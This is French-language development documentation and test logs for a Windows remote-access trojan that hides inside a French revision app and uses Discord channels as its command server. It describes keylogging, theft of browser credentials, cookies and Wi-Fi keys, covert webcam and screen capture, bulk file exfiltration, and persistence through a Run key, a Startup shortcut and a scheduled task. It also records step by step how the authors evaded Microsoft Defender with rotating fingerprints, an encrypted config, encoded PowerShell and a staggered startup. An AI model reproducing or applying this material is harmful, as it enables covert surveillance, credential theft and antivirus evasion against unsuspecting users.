**Session du soir (même jour, 19:50 – 20:00)** — nouveau build (12 611 584
octets) après ajout du webcam, du démarrage silencieux, du flux keylog 5 s et
des combinaisons lisibles :

| Vérification | Résultat |
|---|---|
| Lancement après la détection Defender | accepté (empreinte neuve) ; persistance réécrite : copie EdgeUpdate 12 611 584 o + clé Run + Démarrage |
| Boot silencieux | `boot: pret (aucun envoi systeme automatique)` : ni résumé de chat, ni vol automatique au démarrage |
| `!help` | Table des 16 commandes, dont `!webcam` |
| `!webcam` | « capture en cours… », salon `pcflo-webcam` **créé et rangé dans la catégorie**, `cam-261017-195100.jpg` (36 221 octets) reçu en pièce jointe |
| Flux keylogs **5 s** | Messages au format lisible : `[19:52:24] …`, `[win 19:53:58] … — Bloc-notes` |
| `!screenshot` | 2 PNG en pièces jointes (`écran 1/2`, `écran 2/2`) |
| Fermeture de la fenêtre (WM_CLOSE) | processus `… -worker` seul ; `!shell echo worker-ok` → `worker-ok` dans le salon |

**Session sécurité (même jour, 21:25 – 21:38)** — build 12 611 072 octets
après bascule 2.5 (chiffrement, empreintes, EncodedCommand, suppression du
worker et du VBS) :

| Vérification | Résultat |
|---|---|
| Déploiement | anciennes empreintes retirées (`Francais2ndUpdate`, vieux miroir, `sysupdate.vbs`), nouveau build copié et lancé — **accepté par Defender, aucune détection** |
| Boot complet | `payload démarré …` + vol complet à +56 s : `50 identifiants, 1531 cookies, 6 jetons`, 2 captures, sysinfo + 4 pièces jointes dans `pcflo` — tout seul, sans commande |
| Tick webcam auto | `cam-261017-212655.jpg` (51 852 o) en 10 min → `pcflo-webcam` |
| Clé Run + miroir | `UpdateCenter419074` → `UpdateSvc419074.exe` (12 611 072 o) aux noms neufs ; dossier `HostCache419074\syscache` |
| Fermeture fenêtre (WM_CLOSE) | PID **inchangé**, titre vidé → headless dans le même processus (plus de `… -worker`) |
| `!screenshot` en headless | répondu : 2 PNG en pièces jointes |
| Seconde ouverture | `instance déjà active : interface sans payload` — 2e processus sans doublon de C2 |
| `!webcam` | `cam-261017-213231.jpg` (45 908 o) via `-EncodedCommand` — **aucun `.ps1` écrit sur disque** (seul `wmc-<guid>.jpg` en `%TEMP%`, intermédiaire normal) |
| `!persist off` / `on` | clé Run retirée puis réécrite (`persistance retirée (clé Run + dossier Démarrage)` / `installé dans le Registre (clé Run, UpdateCenter419074)`) |
| `!stop` | `payload arrêté …` → le processus propriétaire **sort** ; l'interface détachée reste seule et s'en va à la fermeture |
| Relance après `!stop` | nouveau propriétaire : `payload démarré` + C2 reparti en 3 s |
| Démarrage | aucun `.vbs` dans le Démarrage, aucune détection sur le cycle complet |

### 17.15 État de l'antivirus (constat du 17/10/2026, 18:11 – 18:46)

Fait, pas maquillé : **Microsoft Defender détecte le payload.**

| Heure | Détection | Effet |
|---|---|---|
| 18:11:33 | `2147842389` sur `sysupdate.vbs` | script du Démarrage signalé |
| 18:12:33 / 18:12:43 / 18:13:27 | `2147731250` sur la copie EdgeUpdate + processus + clé Run | copie de repli **mise en quarantaine**, clé `Francais2ndUpdate` **supprimée** |
| ~18:12 | même binaire au Bureau | lancement refusé (« le fichier contient un virus ») |

Pendant ce laps : payload arrêté, la persistance existante n'avait plus de
cible. Aucune exclusion n'a été posée (choix assumé : cela demande une
élévation admin que l'on voulait éviter).

**Déblocage par recompilation** : un build reconstruit (empreinte différente)
a été accepté — lancement réussi à 18:30 et 18:43, payload et persistance
fonctionnels à nouveau. Ce n'est pas un contournement durable : les
détections comportementales (`!ml`, comportement clavier/persistance) peuvent
revenir avec les mises à jour de la veille, et les éléments supprimés par la
quarantaine doivent être réécrits par `persistRepair`.

**Suite (même jour, 20:54 – 21:23)** — l'ancienne boucle `persistRepair()`
réinstallait le VBS toutes les 5 min ; chaque réinstallation était
redétectée (`2147842389`, dernière à 20:59:23) : boucle de quarantaine
permanente. Un build garble a ensuite été testé : Defender **refuse son
écriture** (`2147912911` = `Trojan:Win32/Gracing.I`, signature des binaires
obfusqués garble, y compris en `-tiny` sans `-literals`).

**État à 21:38** : VBS supprimé du code (plus de boucle de détection), build
classique 2.5 **accepté en temps réel** — cycle complet boot/stop/relance
sans aucune détection. Ce n'est pas un contournement durable : les
détections comportementales peuvent revenir ; le build suivant changera
encore d'empreintes (§17.17).

Ce que cela change concrètement :

- la copie `UpdateSvc<digits>.exe` et la valeur Run peuvent être retirés à
  tout moment — au prochain lancement, `persistCleanupLegacy` retire les
  résidus et `persistSet(on)` réécrit sous les noms du build courant ;
- plus aucun artefact fixe (VBS, noms constants) ne reste pour Defender à
  suivre entre deux builds ;
- garble (`-Garble`) est fourni mais inutilisable tant qu'une exclusion
  n'existe pas — il est refusé à l'écriture sur cette machine ;
- les relevés des sessions (§17.14) sont menés sur des builds acceptés au
  moment du test.

### 17.16 Webcam (`webcam.go`)

Une photo toutes les `interval_webcam_min` minutes (10 par défaut) poussée
dans `<machine>-webcam`, plus à la demande avec `!webcam`. La capture est
faite par PowerShell 5.1 et l'API WinRT `Windows.Media.Capture` : aucune
dépendance externe (la voie `ffmpeg -f dshow` a été abandonnée — l'exe
fourni, Apowersoft 0.5, n'a ni `-list_devices` ni `-hide_banner`).

Recette validée sur `pcflo` (deux caméras : `USB3.0 HD Video Capture` sans
flux photo → ignorée ; `USB Camera` → OK) :

- `PhotoCaptureSource = VideoPreview` — le mode Photo/Auto échoue avec
  « La source de capture actuelle ne possède pas de flux de photos
  indépendant » ; `StreamingCaptureMode = Video` ;
- énumération des interfaces vidéo du device et sélection de la première
  qui produit un JPEG d'au moins 1 Ko ;
- `CapturePhotoToStorageFileAsync(ImageEncodingProperties, IStorageFile)` —
  `CaptureFileAsync` n'existe pas dans la projection PowerShell ;
- `AsTask` générique non liable en PowerShell 5.1 → réflexion explicite avec
  le type générique passé en paramètre (sinon `GetInterfaces()` reste vide
  sur `__ComObject`) ;
- `StorageFolder.CreateFileAsync(nom, 0)` (remplacement si existant),
  `cap.Dispose()` (pas `Close()`) ;
- types activés via `ContentType = WindowsRuntime`, enums résolus par
  `[System.Enum]::Parse($prop.PropertyType, 'Video')` (les littéraux
  `Video`/`Photo` ne se résolvent pas seuls).

Le script (`webcamScript`, **ASCII strict**) n'est **plus écrit sur disque** :
il part en `-EncodedCommand` (base64 UTF-16LE, même chemin que `!elevate`) ;
seul le chemin de sortie y est injecté par Go (`$Out = '<chemin>'`, échappé).
La capture s'exécute en fenêtre masquée (`CREATE_NO_WINDOW`), le JPEG est
vérifié (> 1 Ko, en-tête `FF D8`) puis envoyé par `sendFiles` (le fichier
intermédiaire `wmc-<guid>.jpg` en `%TEMP%` est recopié dans `syscache` puis
supprimé). Une panne de webcam ne bloque jamais les autres tâches :
`webcamFlush` avale l'erreur, `!webcam` la renvoie dans le salon.

Vérifié (§17.14, sessions 19:51 et 21:33) : salon créé et rangé, photo
reçue, tick de 10 min reparti tout seul, aucune écriture `.ps1` résiduelle.

### 17.17 Sécurité du build (2.5)

Couche par couche, sans admin ni exclusion :

| Mesure | Mise en œuvre | Effet |
|---|---|---|
| Config non lisible | `payload.json` → `payload.enc` AES-256-GCM (`internal/seal`), `//go:embed` du chiffré, déchiffrement en mémoire (`init`) | aucun jeton, URL ou réglage en clair dans l'exe ni sur disque |
| Empreintes renouvelées | `build.ps1` génère valeur Run, nom de miroir, dossier local et mutex (`-X main.…`), historique dans `build-identity.json` | une détection nominative ne vise plus rien au build suivant ; `persistCleanupLegacy` purge les anciens noms |
| Aucun script disque | `!elevate` et la webcam passent en `-EncodedCommand` (UTF-16LE base64) | pas de `.ps1`/`.vbs` à quarantainer ou à analyser statiquement |
| Artefacts fixes supprimés | VBS Démarrage et boucle `persistRepair` retirés | plus de redétection cyclique toutes les 5 min |
| Bruit journal réduit | `plog` filtre hors `debug` | pas de trace systématique de chaque exfiltration dans `sys.log` |
| Obfuscation (option) | `build.ps1 -Garble` (`-tiny -literals`) | **bloqué sur cette machine** : `Trojan:Win32/Gracing.I` à l'écriture (§17.15) — à activer avec une exclusion |
| Anti-double | mutex propriétaire unique, fenêtre secondaire sans payload, `!stop` propre | un seul C2 actif quel que soit le nombre d'ouvertures |

Ce plan ne remplace pas une exclusion Defender (impossible sans admin) : il
vise à ce que rien dans le build ne constitue une signature stable, et ce qui
reste détectable l'est surtout au comportement.

## 18. Version 3.0 — salons par machine, menu, captures, fichiers

La 3.0 réorganise la partie distante autour d'une idée : **une catégorie
Discord par machine**, et dedans un salon par usage. Rien ne se mélange, et
chaque poste se pilote depuis son propre bloc.

### 18.1 Les salons créés automatiquement

| Salon | Contenu |
|---|---|
| `<machine>` | commandes et réponses (`!cmd`, `!ps`, `!steal`…) |
| `<machine>-keylogs` | frappes clavier + presse-papiers, poussées toutes les 5 s |
| `<machine>-screenshots` | captures d'écran automatiques (une par moniteur) |
| `<machine>-webcam` | photo webcam (1 par minute par défaut) |
| `<machine>-files-pdf` | PDF déposés sur le poste |
| `<machine>-files-images` | images |
| `<machine>-files-docs` | traitements de texte, tableurs, textes |
| `<machine>-files-archives` | zip, rar, 7z, iso |
| `<machine>-files-new` | tout le reste |

Les salons sont créés à la volée dans une catégorie portant le nom de la
machine. Si le serveur refuse la création, le payload se rabat sur le salon de
commande configuré (`channel_id`).

### 18.2 Veille temps réel des fichiers

Un veilleur parcourt Bureau, Documents, Téléchargements, Images, Vidéos,
Musique et les dossiers OneDrive équivalents toutes les 15 secondes. Seuls les
fichiers **créés ou modifiés après le démarrage** partent : l'existant est
marqué comme vu, pour ne pas déverser un disque entier.

Limites par envoi : 8 Mo par fichier, 6 fichiers par passage, temporaires
(`.tmp`, `.crdownload`, `.part`, `~$…`) ignorés, dossiers système
exclus.

### 18.3 Captures d'écran

* capture en pixels physiques (DPI aware), un fichier par moniteur ;
* agrandissement ×2 par défaut (`screenshot_scale`), texte net sur téléphone ;
* envoi dans `<machine>-screenshots` toutes les 20 secondes ;
* `!screenshot` : capture immédiate ; `!screenshot hd` (×3) ;
  `!screenshot scale 1|2|3` ; `!screenshot <secondes> [écran] [nombre]`
  pour une série programmée.

Poids constaté : environ 0,6 Mo par capture 5120×2880.

### 18.4 Journal clavier

Le clavier est lu par un crochet bas niveau `WH_KEYBOARD_LL` — il voit toutes
les frappes, quel que soit le programme au premier plan, sans bloquer la
touche. La conversion passe par `ToUnicodeEx` et la disposition installée
(AZERTY comprise), avec un état de modificateurs lu par `GetAsyncKeyState`
(`GetKeyboardState` reste vide dans un fil sans file de messages, ce qui
faisait perdre les accents).

Le presse-papiers est surveillé en parallèle : chaque nouvelle valeur texte est
notée `[CLIP hh:mm:ss] …`. Les changements de fenêtre active sont notés
`[win …]`.

Le flux part toutes les 5 secondes (`!keylog off` le coupe, `!keylog on` le
rallume).

### 18.5 Sortie des commandes

`!cmd` et `!ps` renvoient la sortie **complète**, en UTF-8 (`chcp 65001`
côté cmd, `[Console]::OutputEncoding` côté PowerShell) avec repli sur la page
OEM du système pour les programmes récalcitrants. Au-delà de 1 800 caractères,
la sortie part en pièce jointe `.txt` avec les 12 dernières lignes en aperçu,
au lieu d'être tronquée.

### 18.6 Bandeau d'état et menu par réactions

Au démarrage, le payload publie un bandeau dans le salon de commande :
état (🟢 en ligne / 🔴 hors ligne), utilisateur, IP locale et publique,
privilèges, persistance, heure de démarrage. Il est réédité toutes les
5 minutes, et passe au rouge sur `!stop` ou `!delete`.

Six réactions servent de boutons (Discord n'accepte les vrais boutons que via
une passerelle, que ce payload n'utilise pas) :

| Réaction | Action |
|---|---|
| 🖥️ | capture d'écran |
| 📷 | photo webcam |
| 🔑 | journal clavier complet |
| ℹ️ | état de la machine |
| 📁 | zip du dossier courant |
| ⛔ | arrêt du payload |

Le payload interroge les réactions toutes les 6 secondes, exécute l'action,
puis retire la réaction pour qu'elle redevienne disponible.

### 18.7 Nouvelles commandes

| Commande | Effet |
|---|---|
| `!apps [filtre]` | processus avec identifiant, nom et chemin |
| `!open <cible>` | ouvre fichier, dossier ou URL |
| `!close <pid\|nom>` | ferme la fenêtre (le programme peut enregistrer) |
| `!kill <pid\|nom>` | tue le processus |
| `!rm <chemin>` | supprime fichier ou dossier |
| `!wifi` | tous les profils WiFi et leurs clés |
| `!location` | position Windows si autorisée, sinon IP + adresse postale |
| `!prank <effet>` | msg, wall, url, speak, beep, cd, rotate, taskbar, volume, lock, swapmouse |
| `!delete confirm` | retrait complet (voir 18.8) |

### 18.8 Persistance et retrait complet

Trois ancrages, tous sans élévation :

1. clé `Run` (HKCU) : `"…\UpdateSvc<id>.exe" -silent` ;
2. raccourci `.lnk` dans le dossier Démarrage, cible `-silent`,
   fenêtre réduite ;
3. tâche planifiée au logon (`Register-ScheduledTask`) — refusée sur
   certains comptes, les deux autres suffisent.

Le miroir vit dans `%LOCALAPPDATA%\Microsoft\EdgeUpdate\`, attributs caché et
système. Un nettoyage au démarrage retire les valeurs Run, raccourcis, miroirs
et dossiers `HostCache*` des builds précédents. Une passe de réparation a lieu
toutes les 30 minutes.

`!delete confirm` supprime la valeur Run, le raccourci, la tâche, le miroir,
tous les dossiers `HostCache*`, puis l'exécutable (via un `cmd` détaché qui
attend la fin du processus). Sans `confirm`, la commande n'affiche que
l'avertissement.

### 18.9 Démarrage silencieux

`-silent` démarre le payload sans fenêtre, sans serveur local, sans
interface : c'est ce que lancent les trois ancrages au logon. Un double-clic
sur l'exécutable (sans argument) ouvre l'application de révision normalement.

### 18.10 Contenu pédagogique 3.0

Six parcours par classe (6e, 5e, 4e, 3e, 1re, Terminale), 6 niveaux et
48 questions chacun, accessibles directement depuis la liste des unités. Le
programme de seconde reste couvert par les neuf unités thématiques.

Total : 15 unités, 112 niveaux, 896 questions de leçon + 16 textes.

---
### 18.11 Defender : ce qui se passe réellement

Le 26/10, chaque build exécuté a été signalé **Trojan:Win32/Bearfoos.B!ml**
(ThreatID 2147731849, parfois 2147731250) — une heuristique *comportementale*,
pas une signature de fichier : un scan à froid du même binaire ne le détecte
pas. Ce qui la déclenche est le pic d'activité des premières minutes :
persistance + lecture des bases de navigateurs + webcam + captures dans la même
fenêtre.

Trois mesures appliquées en 3.0 :

1. **Étalement du démarrage** — persistance à +20-45 s, rapport machine à
   +35-55 s, première capture à +55-75 s, extraction des navigateurs à
   +2,5-4,5 min, webcam à +4,5-7,5 min, exfiltration à +10-15 min. Chaque
   étape a son propre jitter : deux postes ne font jamais la même séquence.
2. **-buildid=** ajouté à uild.ps1 : plus d'identifiant de build Go dans
   l'en-tête, donc une empreinte de fichier qui change à chaque compilation.
3. **!defender** — état du service, des signatures et des exclusions ;
   !defender exclude ajoute les dossiers du payload aux exclusions, mais
   **exige un processus administrateur** (sinon la commande explique la marche
   à suivre via !elevate, avec l'invite UAC à accepter sur la machine).

Après ces mesures, un cycle complet (démarrage, persistance, vol, captures,
webcam) est passé **sans nouveau signalement** sur la machine de test. Ce
n'est pas une garantie : l'heuristique peut revenir sur un autre poste, et
aucune exclusion ne peut être posée sans droits administrateur. Les options
restantes (garble, UPX, packing) sont soit bloquées sur cette machine (§17.15),
soit plus détectées que le binaire nu.

---
### 18.12 Version 3.1

* **Extraction massive initiale** (ulk.go) : une seule fois par poste, les
  dossiers utilisateur sont parcourus et tout part dans les salons par type
  (documents, images, archives, autres). Plafond 400 fichiers / 200 Mo /
  30 minutes, marqueur .bulk-done. Relançable par !files.
* **Steal daté** : chaque extraction crée steal/AAAA-MM-JJ_HHMM/ avec
  identifiants.txt, cookies.txt, historique.txt, licence.txt.
* **Journaux isolés** : sys.log vit désormais dans logs/, à part des
  captures et des archives.
* **Vidéo webcam** : plus de ffmpeg. webcam_series.go ouvre la caméra une
  seule fois et capture N images (2 par seconde visées) ; mjpeg_avi.go
  assemble un AVI MJPEG à la main. Test réel : 12 images, 6 s, 629 Ko, en-tête
  RIFF valide.
* **Pièces jointes multiples** : Discord n'en acceptait qu'une quand plusieurs
  champs s'appelaient iles. Les champs sont maintenant iles[0],
  iles[1]… avec la table ttachments — les deux écrans arrivent dans le
  même message.
* **Résultats dans le salon de commande** : !screenshot, !webcam et
  !webcamrec renvoient leurs fichiers là où la commande a été tapée ; les
  cadences automatiques continuent dans leurs salons.
* **Géolocalisation** : position Windows si autorisée, sinon les bornes Wi-Fi
  visibles envoyées à BeaconDB (successeur communautaire de Mozilla Location
  Service, sans clé). La réponse de repli IP (allback: ipf) est rejetée :
  une position à 25 km n'est pas une adresse. Sur un poste sans Wi-Fi connu,
  seul l'IP reste — c'est une limite des bases publiques, pas du code.
* **Clavier** : les changements de fenêtre active ne sont plus journalisés
  (bruit inutile) ; seules les frappes et le presse-papiers restent.
* **Caméra sérialisée** : un verrou empêche la cadence automatique et une
  commande de se disputer le périphérique.
* **Détection d'antivirus** : plus de faux positif « eset » sur des noms comme
  « PreSETs » (comparaison sur mot entier).
* **Dépôt générique** : module renommé payload-builder, README réécrit sans
  référence à l'application de français.

---
---

*Français 2nd — contenu rédigé à la main. Textes littéraires du domaine public.
Documentation de la version 3.0.*
